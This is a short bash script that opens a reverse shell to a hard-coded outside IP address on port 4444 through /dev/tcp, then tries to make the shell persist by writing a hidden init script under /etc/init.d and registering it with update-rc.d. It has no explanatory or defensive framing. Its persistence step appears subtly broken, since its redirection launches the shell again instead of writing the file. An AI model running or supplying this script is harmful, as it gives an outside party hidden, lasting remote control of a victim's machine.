#!/usr/bin/env bash
PERSISTENCE=1
HOST=206.189.231.131
PORT=4444

bash &> /dev/tcp/$HOST/$PORT 0>&1

if [ $PERSISTENCE -eq 1 ]
then
    echo bash &> /dev/tcp/$HOST/$PORT 0>&1 > /etc/init.d/.espl.sh

    chmod +x /etc/init.d/.espl.sh

    update-rc.d .espl.sh defaults 100
fi
